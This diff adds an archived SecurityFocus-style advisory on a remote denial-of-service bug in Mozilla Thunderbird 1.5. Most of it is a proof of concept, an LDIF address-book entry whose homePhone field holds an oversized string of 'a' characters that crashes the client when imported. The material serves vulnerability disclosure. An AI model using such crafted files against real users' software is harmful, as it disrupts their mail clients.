@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/16716/info
+
+Mozilla Thunderbird is prone to a remote denial-of-service vulnerability. 
+
+The issue presents itself when the application handles a specially crafted address book file.
+
+Mozilla Thunderbird 1.5 is reportedly affected by this issue. Other versions may be vulnerable as well.
+
+POC: create a file.ldif and insert following then import it in address book:
+n: cn=Test POC by DrFrancky@securax.org,mail=drfrancky@securax.org
+objectclass: top
+objectclass: person
+objectclass: organizationalPerson
+objectclass: inetOrgPerson
+objectclass: mozillaAbPersonAlpha
+givenName: Test
+sn: POC by DrFrancky@securax.org
+cn: POC by DrFrancky@securax.org
+mozillaNickname: DrFrancky
+mail: drfrancky@securax.org
+nsAIMid: DrFrancky POC
+modifytimestamp: 0Z
+homePhone: aaaaaaaaaaaaaaa[2MB of 'a']
